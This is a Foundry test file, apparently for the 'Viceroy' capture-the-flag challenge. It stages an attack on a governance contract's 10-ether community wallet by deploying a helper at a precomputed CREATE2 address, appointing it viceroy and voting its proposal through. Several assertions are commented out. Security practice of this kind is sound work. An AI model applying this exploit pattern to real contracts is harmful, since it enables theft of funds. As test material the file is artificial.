// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Test, console } from 'forge-std/Test.sol';
import { Governance } from '../src/Viceroy.sol';
import { OligarchyNFT } from '../src/Viceroy.sol';
import { CommunityWallet } from '../src/Viceroy.sol';
import { AttackerHelper } from '../src/Viceroy.sol';
import { Create2Factory } from '../src/Viceroy.sol';

contract ViceroyTest is Test {
  Governance public governance;
  OligarchyNFT public oligarch;

  AttackerHelper public attackerHelper;
  Create2Factory public factory;

  address public attacker;
  address public viceroy;
  address public voter;

  uint256 constant SALT = 347309243929;
  uint256 constant ETH_AMOUNT = 10 ether;

  function setUp() public {
    attacker = makeAddr('attacker');
    viceroy = makeAddr('viceroy');
    voter = makeAddr('voter');

    oligarch = new OligarchyNFT(attacker);
    governance = new Governance{ value: ETH_AMOUNT }(oligarch);
    factory = new Create2Factory();

    address wallet = address(governance.communityWallet());
    assertEq(wallet.balance, ETH_AMOUNT, 'Governance should have 10 ether');
  }

  function deploy() public {
    bytes memory bytecode = factory.getBytecode(address(governance), viceroy, voter);
    address addr = factory.getAddress(bytecode, SALT);

    governance.appointViceroy(addr, 1);
    factory.deploy(SALT, address(governance), viceroy, voter);
    attackerHelper = factory.deployedContract();

    assertEq(addr, address(attackerHelper), 'Deployed contract should be the same');
  }

  function testAttack() public {
    checkAddresses();
    // //uint256 nonceBefore = vm.getNonce(attackerWallet);
    vm.startPrank(attacker);
    deploy();
    vm.stopPrank();

    vm.startPrank(voter);
    governance.voteOnProposal(uint256(keccak256(attackerHelper.proposalData())), true, address(attackerHelper));
    vm.stopPrank();

    //governance.voteOnProposal(uint256(keccak256(deployedContract2.PROPOSAL())), true, attacker);

    // assertEq(address(communityWallet).balance, 0, 'Community wallet should be empty after attack');
    // //assertEq(vm.getNonce(attackerWallet) - nonceBefore, 1, 'Must exploit in one transaction');
    // uint256 attackerBalance = address(attackerWallet).balance;
    // assertTrue(attackerBalance >= 10 ether, 'Attacker should have gained at least 10 ether');
  }

  function voterVote() public {
    vm.startPrank(voter);
    governance.voteOnProposal(uint256(keccak256(attackerHelper.proposalData())), true, address(attackerHelper));
    vm.stopPrank();
  }

  function checkAddresses() public {
    console.log('attacker', attacker);
    console.log('attackerHelper', address(attackerHelper));

    console.log('voter', address(voter));
  }
}
